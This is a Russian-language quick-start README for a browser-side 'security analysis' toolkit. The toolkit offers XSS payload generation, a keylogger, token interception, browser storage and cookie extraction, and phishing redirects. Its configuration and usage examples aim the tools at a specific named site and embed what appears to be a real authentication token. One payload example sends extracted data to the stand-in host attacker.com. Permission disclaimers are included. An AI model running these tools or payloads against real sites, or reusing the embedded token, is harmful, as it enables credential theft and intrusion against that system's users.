# 🚀 ЗАПУСК ИНСТРУМЕНТОВ АНАЛИЗА БЕЗОПАСНОСТИ

## 📁 Содержимое папки

```
security_analysis_tools/
├── START_HERE.md                    # Этот файл - инструкции по запуску
├── README_SECURITY_TOOLS.md         # Подробная документация
├── security_demo.html               # Демонстрационная страница
├── security_analysis_framework.js   # Основной фреймворк
├── api_analyzer.js                  # Анализатор API
├── xss_payload_generator.js         # Генератор XSS payload
├── comprehensive_security_audit.js  # Комплексный аудит
├── example_usage.js                 # Примеры использования
├── real_data_extractor.js          # Экстрактор реальных данных
└── extract_data.js                  # Базовый экстрактор
```

## 🎯 Быстрый старт

### 1. Запуск демонстрационной страницы

```bash
# Перейдите в папку с инструментами
cd security_analysis_tools

# Запустите HTTP сервер
python3 -m http.server 8080

# Откройте в браузере
http://localhost:8080/security_demo.html
```

### 2. Использование в консоли браузера

Откройте консоль разработчика (F12) и выполните:

```javascript
// Инициализация комплексного аудитора
const auditor = new ComprehensiveSecurityAudit();
auditor.init('https://example.com', 'your-token', jsContent);

// Запуск полного анализа
auditor.runFullAudit().then(report => {
    console.log('Отчет:', report);
});
```

### 3. Запуск примеров

```javascript
// Запуск всех примеров
SecurityExamples.runAllExamples();

// Или отдельные примеры
SecurityExamples.exampleDataLeakAnalysis();
SecurityExamples.exampleAPIAnalysis();
SecurityExamples.exampleXSSPayloads();
```

## 🔧 Настройка

### Конфигурация для конкретной системы

```javascript
const config = {
    targetUrl: 'https://applications.iidf.ru',
    authToken: 'user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2',
    jsContent: `// Вставьте JavaScript код для анализа`
};

const auditor = new ComprehensiveSecurityAudit();
auditor.init(config.targetUrl, config.authToken, config.jsContent);
```

## 📊 Типы анализа

### 1. Анализ утечек данных
- Извлечение данных из localStorage/sessionStorage
- Анализ cookies
- Проверка форм на чувствительные поля
- Извлечение мета-данных

### 2. Анализ API
- Обнаружение API эндпоинтов в коде
- Тестирование безопасности эндпоинтов
- Проверка заголовков безопасности
- Анализ уязвимостей API

### 3. XSS анализ
- Генерация различных типов XSS payload
- Демонстрация уязвимостей
- Payload для извлечения данных
- Keylogger и перенаправления

### 4. Комплексный аудит
- Полный анализ всех компонентов
- Генерация детальных отчетов
- Оценка уровня риска
- Рекомендации по устранению

## 🎭 Демонстрации

### Включенные демонстрации:
1. **Утечка данных** - показывает, как извлекаются данные из браузера
2. **Перехват токенов** - демонстрирует перехват аутентификационных данных
3. **Keylogger** - показывает перехват пользовательского ввода
4. **Фишинговое перенаправление** - демонстрирует фишинговые атаки

### Запуск демонстраций:
```javascript
// В консоли браузера
demonstrateDataLeak();
demonstrateTokenInterception();
demonstrateKeylogger();
demonstrateRedirect();
```

## 📋 Генерация отчетов

### Автоматическое сохранение
```javascript
const report = await auditor.runFullAudit();
auditor.saveReport(report); // Сохраняет как JSON файл
```

### Ручное сохранение
```javascript
auditor.saveReport(report, 'my_custom_report.json');
```

## ⚠️ Важные замечания

1. **Используйте только на системах, которыми владеете**
2. **Получите разрешение перед тестированием чужих систем**
3. **Эти инструменты предназначены для обучения**
4. **Не используйте для незаконной деятельности**

## 🔍 Примеры использования

### Анализ конкретной системы
```javascript
// Анализ системы applications.iidf.ru
const targetSystem = {
    url: 'https://applications.iidf.ru',
    authToken: 'user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2'
};

const auditor = new ComprehensiveSecurityAudit();
auditor.init(targetSystem.url, targetSystem.authToken);
const report = await auditor.runFullAudit();
```

### Создание кастомного XSS payload
```javascript
const generator = new XSSPayloadGenerator();
const customPayload = generator.createCustomPayload({
    action: 'notification',
    message: 'Демонстрация XSS',
    dataExtraction: true,
    targetUrl: 'https://attacker.com'
});
```

## 🚨 Устранение неполадок

### Проблема: CORS ошибки
**Решение:** Используйте прокси или настройте CORS на сервере

### Проблема: Инструменты не загружаются
**Решение:** Убедитесь, что все JS файлы подключены в HTML

### Проблема: Ошибки в консоли
**Решение:** Проверьте, что все зависимости загружены

## 📞 Поддержка

Если возникли проблемы:
1. Проверьте консоль браузера на ошибки
2. Убедитесь, что все файлы загружены
3. Проверьте настройки CORS
4. Убедитесь, что у вас есть разрешение на тестирование

---

**🔒 Готово к использованию! Откройте security_demo.html в браузере.**

